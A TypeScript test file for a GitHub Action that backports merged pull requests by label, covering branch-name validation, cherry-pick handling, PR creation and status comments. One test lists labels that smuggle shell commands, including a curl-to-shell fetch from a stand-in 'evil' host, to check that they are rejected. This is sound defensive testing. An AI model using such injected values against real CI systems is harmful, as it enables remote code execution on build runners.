import { strict as assert } from "node:assert";
import { readFile } from "node:fs/promises";
import type { PullRequestClosedEvent } from "@octokit/webhooks-types";
import { template } from "lodash-es";
import { describe, it } from "node:test";
import type { ConflictResolution } from "./backport.js";
import {
  backportOnce,
  cherryPick,
  getCherryPickArgs,
  getReviewers,
  getTargets,
  isSafeBranchName,
} from "./backport.js";
import {
  getCompareUrl,
  getFailureCommentBody,
  getSuccessCommentBody,
  upsertStatusComment,
} from "./comments.js";
import type { Git, GitResult } from "./git.js";
import { redact } from "./git.js";
import type { Github } from "./github.js";

const labelRegExp = /^auto-backport-to-(?<base>([^ ]+))$/;

const closedPayload = (labels: string[]) =>
  ({
    action: "closed",
    pull_request: { labels: labels.map((name) => ({ name })) },
  } as unknown as PullRequestClosedEvent);

type Call = { parameters: { [key: string]: unknown }; route: string };

const fakeGithub = ({
  comments = [],
  existingPullRequests = [],
  failing = () => false,
}: {
  comments?: Array<{ body: string; id: number; user: { type: string } }>;
  existingPullRequests?: Array<{ number: number }>;
  failing?: (call: Call) => boolean;
} = {}) => {
  const calls: Call[] = [];
  const github = {
    async paginate(route: string, parameters: { [key: string]: unknown }) {
      calls.push({ parameters, route });
      return comments;
    },
    async request(route: string, parameters: { [key: string]: unknown }) {
      const call = { parameters, route };
      calls.push(call);
      if (failing(call)) {
        throw new Error(`${route} failed`);
      }

      if (route === "GET /repos/{owner}/{repo}/pulls") {
        return { data: existingPullRequests };
      }

      return { data: { number: 42 } };
    },
  } as unknown as Github;
  return { calls, github };
};

// Each git command succeeds unless the handler returns another result for it.
const fakeGit = (
  handler: (command: string) => Partial<GitResult> | undefined = () =>
    undefined,
) => {
  const calls: string[] = [];
  const git: Git = async (args, { ignoreReturnCode = false } = {}) => {
    const command = args.join(" ");
    calls.push(command);
    const result = { exitCode: 0, stderr: "", stdout: "", ...handler(command) };
    if (result.exitCode !== 0 && !ignoreReturnCode) {
      throw new Error(`git ${command} failed`);
    }

    return result;
  };

  return { calls, git };
};

const head = "backport-1-to-17.x";

// The base branch exists, the head branch doesn't.
const remoteBranches = (command: string) =>
  command.startsWith("ls-remote") && command.endsWith(head)
    ? { exitCode: 2 }
    : undefined;

const options = {
  author: "contributor",
  base: "17.x",
  body: "body",
  cherryPickArgs: ["abc123"],
  conflictResolution: "fail" as ConflictResolution,
  head,
  labels: ["bug", "backport"],
  mergedBy: "maintainer",
  owner: "owner",
  repo: "repo",
  title: "title",
};

describe("default templates", async () => {
  const actionYml = await readFile(
    new URL("../action.yml", import.meta.url),
    "utf8",
  );
  const getDefault = (input: string) => {
    const match = new RegExp(`${input}:[\\s\\S]*?default: (".*")`).exec(
      actionYml,
    );
    if (!match?.[1]) {
      throw new Error(`No default for ${input}.`);
    }

    // YAML double-quoted strings use the same escapes as JSON for these templates.
    return template(JSON.parse(match[1]) as string);
  };

  it("keeps the original body verbatim after a blank line", () => {
    const body = 'Don\'t <b>escape</b> & "quote"';
    assert.equal(
      getDefault("body_template")({
        base: "17.x",
        body,
        mergeCommitSha: "abc123",
        number: 1,
      }),
      `Backport abc123 from #1.\n\n${body}`,
    );
  });

  it("creates draft PRs on conflicts by default", () => {
    assert.match(actionYml, /conflict_resolution:[\s\S]*?default: draft\n/);
  });

  it("keeps the original title verbatim", () => {
    assert.equal(
      getDefault("title_template")({
        base: "17.x",
        number: 1,
        title: "fix: don't break",
      }),
      "fix: don't break (backport to 17.x)",
    );
  });
});

describe("getTargets", () => {
  it("extracts the base branches and their labels", () => {
    assert.deepEqual(
      getTargets({
        labelRegExp,
        payload: closedPayload([
          "bug",
          "auto-backport-to-16.x",
          "auto-backport-to-17.x",
        ]),
      }),
      [
        { base: "16.x", label: "auto-backport-to-16.x" },
        { base: "17.x", label: "auto-backport-to-17.x" },
      ],
    );
  });

  it("rejects labels that would inject options or shell syntax", () => {
    for (const label of [
      "auto-backport-to---orphan=x",
      // eslint-disable-next-line no-template-curly-in-string
      "auto-backport-to-x$(curl${IFS}evil|sh)",
      "auto-backport-to-x`id`",
      "auto-backport-to-x;id",
    ]) {
      assert.throws(
        () => getTargets({ labelRegExp, payload: closedPayload([label]) }),
        /unsafe branch name/,
        label,
      );
    }
  });
});

describe("isSafeBranchName", () => {
  it("accepts usual branch names", () => {
    for (const name of [
      "main",
      "17.x",
      "release/v18.4",
      "backport-12-to-17.x",
    ]) {
      assert.ok(isSafeBranchName(name), name);
    }
  });

  it("rejects invalid branch names", () => {
    for (const name of ["-x", "a..b", "a/", "a.lock", "a b", "a@{1}", "a//b"]) {
      assert.ok(!isSafeBranchName(name), name);
    }
  });
});

describe("getReviewers", () => {
  it("requests both the author and the merger", () => {
    assert.deepEqual(getReviewers({ author: "a", mergedBy: "b" }), ["a", "b"]);
  });

  it("deduplicates and skips bots and empty logins", () => {
    assert.deepEqual(getReviewers({ author: "a", mergedBy: "a" }), ["a"]);
    assert.deepEqual(getReviewers({ author: "a", mergedBy: "" }), ["a"]);
    assert.deepEqual(
      getReviewers({ author: "dependabot[bot]", mergedBy: "b" }),
      ["b"],
    );
  });
});

describe("getCherryPickArgs", () => {
  const mergeCommitSha = "abc123";

  it("picks merge commits against their first parent", () => {
    assert.deepEqual(
      getCherryPickArgs({
        mergeCommitSha,
        mergedMessages: [],
        parentCount: 2,
        pullRequestMessages: ["a", "b"],
      }),
      ["--mainline", "1", mergeCommitSha],
    );
  });

  it("picks every commit of a rebase and merge", () => {
    assert.deepEqual(
      getCherryPickArgs({
        mergeCommitSha,
        mergedMessages: ["a\n", "b"],
        parentCount: 1,
        pullRequestMessages: ["a", "b\n"],
      }),
      [`${mergeCommitSha}~2..${mergeCommitSha}`],
    );
  });

  it("picks the squashed commit", () => {
    assert.deepEqual(
      getCherryPickArgs({
        mergeCommitSha,
        mergedMessages: ["something else", "fix: a and b (#1)"],
        parentCount: 1,
        pullRequestMessages: ["a", "b"],
      }),
      [mergeCommitSha],
    );
  });

  it("picks the single commit of a one-commit PR", () => {
    assert.deepEqual(
      getCherryPickArgs({
        mergeCommitSha,
        mergedMessages: ["a"],
        parentCount: 1,
        pullRequestMessages: ["a"],
      }),
      [mergeCommitSha],
    );
  });
});

describe("cherryPick", () => {
  const conflicting = (remaining: number[]) => (command: string) => {
    if (
      command.startsWith("cherry-pick -x") ||
      command.endsWith("--continue")
    ) {
      return remaining.shift() ? { exitCode: 1 } : undefined;
    }

    if (command.startsWith("diff --name-only")) {
      return { stdout: "src/a.ts\nsrc/b.ts\n" };
    }

    return undefined;
  };

  it("aborts and lists the conflicted files", async () => {
    const { calls, git } = fakeGit(conflicting([1]));
    await assert.rejects(
      cherryPick({
        cherryPickArgs: ["abc123"],
        conflictResolution: "fail",
        git,
      }),
      /conflicts in:\n- src\/a.ts\n- src\/b.ts/,
    );
    assert.ok(calls.includes("cherry-pick --abort"));
  });

  it("reports git's output for failures that aren't conflicts", async () => {
    const { calls, git } = fakeGit((command) => {
      if (command.startsWith("cherry-pick -x")) {
        return { exitCode: 1, stderr: "The previous cherry-pick is now empty" };
      }

      return undefined;
    });
    await assert.rejects(
      cherryPick({
        cherryPickArgs: ["abc123"],
        conflictResolution: "draft",
        git,
      }),
      /now empty/,
    );
    assert.ok(calls.includes("cherry-pick --abort"));
  });

  it("commits the conflicts of every commit in draft mode", async () => {
    const { calls, git } = fakeGit(conflicting([1, 1]));
    assert.deepEqual(
      await cherryPick({
        cherryPickArgs: ["abc~2..abc"],
        conflictResolution: "draft",
        git,
      }),
      ["src/a.ts", "src/b.ts"],
    );
    assert.equal(
      calls.filter((command) => command.endsWith("--continue")).length,
      2,
    );
    assert.ok(!calls.includes("cherry-pick --abort"));
  });
});

describe("backportOnce", () => {
  it("cherry-picks, pushes and creates the PR", async () => {
    const { calls: gitCalls, git } = fakeGit(remoteBranches);
    const { calls, github } = fakeGithub();
    assert.deepEqual(await backportOnce({ ...options, git, github }), {
      conflicts: [],
      number: 42,
    });
    assert.deepEqual(gitCalls, [
      `ls-remote --exit-code --heads origin ${head}`,
      "ls-remote --exit-code --heads origin 17.x",
      "switch 17.x",
      `switch --create ${head}`,
      "cherry-pick -x abc123",
      `push --set-upstream origin ${head}`,
    ]);
    assert.equal(calls[1]?.parameters.draft, false);
  });

  it("reports a missing base branch", async () => {
    const { git } = fakeGit((command) =>
      command.startsWith("ls-remote") ? { exitCode: 2 } : undefined,
    );
    const { github } = fakeGithub();
    await assert.rejects(
      backportOnce({ ...options, git, github }),
      /The `17.x` branch doesn't exist./,
    );
  });

  it("creates a draft PR with the conflicts", async () => {
    const { git } = fakeGit((command) => {
      if (command.startsWith("cherry-pick -x")) {
        return { exitCode: 1 };
      }

      if (command.startsWith("diff --name-only")) {
        return { stdout: "src/a.ts\n" };
      }

      return remoteBranches(command);
    });
    const { calls, github } = fakeGithub();
    assert.deepEqual(
      await backportOnce({
        ...options,
        conflictResolution: "draft",
        git,
        github,
      }),
      { conflicts: ["src/a.ts"], number: 42 },
    );
    const create = calls.find(
      ({ route }) => route === "POST /repos/{owner}/{repo}/pulls",
    );
    assert.equal(create?.parameters.draft, true);
    assert.match(String(create?.parameters.body), /`src\/a.ts`[\s\S]*body$/);
  });

  it("falls back to a regular PR when drafts aren't available", async () => {
    const { git } = fakeGit((command) => {
      if (command.startsWith("cherry-pick -x")) {
        return { exitCode: 1 };
      }

      if (command.startsWith("diff --name-only")) {
        return { stdout: "src/a.ts\n" };
      }

      return remoteBranches(command);
    });
    const { calls, github } = fakeGithub({
      failing: ({ parameters }) => parameters.draft === true,
    });
    const { number } = await backportOnce({
      ...options,
      conflictResolution: "draft",
      git,
      github,
    });
    assert.equal(number, 42);
    assert.equal(
      calls.filter(({ route }) => route === "POST /repos/{owner}/{repo}/pulls")
        .length,
      2,
    );
  });

  it("succeeds when decorating the created PR fails", async () => {
    const { git } = fakeGit(remoteBranches);
    const { calls, github } = fakeGithub({
      failing: ({ route }) =>
        route.includes("requested_reviewers") || route.includes("assignees"),
    });
    const { number } = await backportOnce({ ...options, git, github });
    assert.equal(number, 42);
    assert.ok(calls.some(({ route }) => route.endsWith("/labels")));
  });

  it("returns the existing PR instead of failing on reruns", async () => {
    const { calls: gitCalls, git } = fakeGit();
    const { calls, github } = fakeGithub({
      existingPullRequests: [{ number: 7 }],
    });
    const { number } = await backportOnce({ ...options, git, github });
    assert.equal(number, 7);
    assert.deepEqual(gitCalls, []);
    assert.equal(calls.length, 1);
  });

  it("reuses a branch left over by a previous run", async () => {
    const { calls: gitCalls, git } = fakeGit();
    const { github } = fakeGithub();
    const { number } = await backportOnce({ ...options, git, github });
    assert.equal(number, 42);
    assert.deepEqual(gitCalls, [
      `ls-remote --exit-code --heads origin ${head}`,
    ]);
  });
});

describe("comments", () => {
  const repositoryUrl = "https://github.com/owner/repo";

  it("links to a pre-filled pull request", () => {
    assert.equal(
      getCompareUrl({
        base: "17.x",
        body: "a b",
        head,
        repositoryUrl,
        title: "t & u",
      }),
      `${repositoryUrl}/compare/17.x...${head}?expand=1&title=t%20%26%20u&body=a%20b`,
    );
  });

  it("leaves long bodies out of the link", () => {
    const url = getCompareUrl({
      base: "17.x",
      body: "x".repeat(10_000),
      head,
      repositoryUrl,
      title: "t",
    });
    assert.ok(!url.includes("&body="));
  });

  it("explains how to retry and how to backport manually", () => {
    const body = getFailureCommentBody({
      base: "17.x",
      body: "b",
      cherryPickArgs: ["--mainline", "1", "abc123"],
      errorMessage: "The cherry-pick has conflicts in:\n- src/a.ts",
      head,
      label: "auto-backport-to-17.x",
      repositoryUrl,
      title: "t",
    });
    assert.match(body, /^<!-- backport-status: 17.x -->/);
    assert.match(body, /- src\/a.ts/);
    assert.match(
      body,
      /remove the `auto-backport-to-17.x` label and add it again/,
    );
    assert.match(body, /git cherry-pick -x --mainline 1 abc123/);
    assert.match(body, /\[create the pull request]\(https:/);
  });

  it("reports successful backports", () => {
    assert.equal(
      getSuccessCommentBody({ base: "17.x", conflicts: [], number: 42 }),
      "<!-- backport-status: 17.x -->\nBackported to `17.x` in #42.",
    );
    assert.match(
      getSuccessCommentBody({ base: "17.x", conflicts: ["a.ts"], number: 42 }),
      /as a draft[\s\S]*- `a.ts`/,
    );
  });

  it("updates the existing status comment of the same branch", async () => {
    const { calls, github } = fakeGithub({
      comments: [
        {
          body: "<!-- backport-status: 16.x -->",
          id: 1,
          user: { type: "Bot" },
        },
        {
          body: "<!-- backport-status: 17.x -->",
          id: 2,
          user: { type: "User" },
        },
        {
          body: "<!-- backport-status: 17.x -->",
          id: 3,
          user: { type: "Bot" },
        },
      ],
    });
    await upsertStatusComment({
      base: "17.x",
      body: "new",
      github,
      number: 1,
      owner: "owner",
      repo: "repo",
    });
    assert.equal(calls[1]?.route.split(" ")[0], "PATCH");
    assert.equal(calls[1]?.parameters.comment_id, 3);
  });

  it("creates a status comment when there is none", async () => {
    const { calls, github } = fakeGithub();
    await upsertStatusComment({
      base: "17.x",
      body: "new",
      github,
      number: 1,
      owner: "owner",
      repo: "repo",
    });
    assert.equal(calls[1]?.route.split(" ")[0], "POST");
  });
});

describe("redact", () => {
  it("hides secrets from git's output", () => {
    assert.equal(
      redact("fatal: https://x-access-token:ghs_secret@github.com", [
        "ghs_secret",
      ]),
      "fatal: https://x-access-token:***@github.com",
    );
  });
});
